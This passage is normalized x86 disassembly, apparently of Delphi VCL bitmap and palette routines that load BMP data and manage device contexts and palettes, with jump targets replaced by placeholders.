mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_422474
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e2c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4223f4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_422634
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422040
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41e07c
sub_422474
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_422634
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421210
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_422100
sub_4224bc
push ebx
mov ebx eax
mov eax ebx
call sub_422624
mov eax ebx
call sub_422634
mov edx ebx
mov eax ebx
call sub_422100
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4224e0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_422560
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c958
mov eax ebx
call sub_422530
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_422474
xor edx edx
pop ecx
call sub_41dcb8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4225b0
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_422734
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4215d8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_422634
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415bbc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4226b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4226d4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_422624
mov eax ebx
call sub_422634
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_422560
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421ca0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_421194
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_422734
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e814
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_421194
push 0x0
call GetDC
call sub_41e124
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4227ec
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41dfec
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_422040
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_422624
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_422870
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415b9c
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_422f84
pop esi
pop ebx
retn
sub_422894
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_41655c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4228e8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228ef
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_4228f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42297b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4229db
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_421408
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_421404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229e2
push rw-data
call LeaveCriticalSection
retn
sub_4229f4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_422f84
pop edx
pop edi
pop esi
pop ebx
retn
sub_422a1c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422f39
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_422f0c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c64
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41e004
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415e38
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415dc8
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e294
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e2b4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_415dc8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41e124
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_422e87
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41e55c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_422def
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415dc8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41e124
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_422dc3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e814
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ccf4
call sub_41e004
jmp r-xdata
xor eax eax
push ebp
push sub_422e56
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415dc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422dca
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e8e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ccf4
call sub_41e004
jmp r-xdata
sub_422dca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_422e8e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422f23
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e814
mov [ ebp - 0x30 ] eax
sub_422f40
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4228f4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422f84
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422624
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415dc8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4228f4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_422a1c
call sub_41e004
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_422ff4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_422624
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_421c3c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42308f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4228f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4230b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4224e0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_422624
mov eax esi
call sub_422734
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_422624
mov eax esi
call sub_422734
mov eax esi
call sub_4225b0
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_421c3c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_422040
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4228f4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4228f4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4215d8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4231f0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_422634
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422040
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423244
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_422634
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_422040
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4232c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_422624
mov eax ebx
call sub_422634
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4215d8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42335b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4228f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4214d0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41c088
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_423360
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a0c
call sub_403a60
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4214d0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423398
push ebx
push esi
mov esi eax
